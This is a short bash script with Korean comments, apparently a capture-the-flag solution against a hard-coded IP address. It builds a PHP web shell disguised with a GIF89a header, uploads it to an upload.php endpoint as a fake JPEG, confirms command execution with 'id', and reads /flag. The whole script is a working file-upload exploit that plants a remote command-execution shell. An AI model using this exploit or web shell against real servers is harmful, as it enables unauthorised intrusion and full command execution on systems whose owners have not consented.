#!/bin/bash

TARGET="http://3.37.76.41"
UPLOAD_ENDPOINT="$TARGET/upload.php"       # 업로드 기능 위치 (여기 맞게 수정)
SHELL_NAME="shell.php"
WEB_ACCESS_PATH="$TARGET/uploads/$SHELL_NAME"

# 1. 웹쉘 payload 생성
echo "[*] Generating webshell payload..."
echo -e "GIF89a\n<?php system(\$_GET['cmd']); ?>" > $SHELL_NAME

# 2. 업로드 시도
echo "[*] Uploading shell as $SHELL_NAME..."

RESPONSE=$(curl -s -F "file=@$SHELL_NAME;type=image/jpeg" "$UPLOAD_ENDPOINT")

if echo "$RESPONSE" | grep -iq "success\|완료\|성공"; then
  echo "[+] Shell uploaded successfully!"
else
  echo "[!] Upload may have failed. Check manually."
fi

# 3. 명령 실행 테스트
echo "[*] Testing shell execution..."

CMD_RESULT=$(curl -s "$WEB_ACCESS_PATH?cmd=id")

if [ -n "$CMD_RESULT" ]; then
  echo "[+] Shell is live!"
  echo "$CMD_RESULT"
else
  echo "[!] Shell seems unreachable at $WEB_ACCESS_PATH"
  exit 1
fi

# 4. 플래그 요청
echo "[*] Executing: cat /flag"
curl "$WEB_ACCESS_PATH?cmd=cat+/flag"
